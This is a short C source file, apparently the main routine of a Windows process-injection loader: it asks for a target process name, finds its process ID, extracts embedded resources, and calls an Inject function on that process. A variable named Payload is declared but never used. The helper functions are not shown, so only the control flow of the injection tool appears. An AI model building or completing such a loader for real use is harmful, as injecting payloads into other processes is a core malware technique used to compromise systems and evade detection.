#include "Loader.h"

int main(int argc, char *argv[])
{
	CHAR	ProcessName[MAX_PATH];
	PRSRC	Payload;
	DWORD	Pid;
	
	puts("[*] Enter Target Process Name: ");
	scanf_s("%s", ProcessName);

	Pid		= GetPid(ProcessName);

	if (Pid)
	{
		ExtractResources();

		Inject(Pid);
	}
	else
		puts("[-] Couldn't found target process");

	system("pause");
}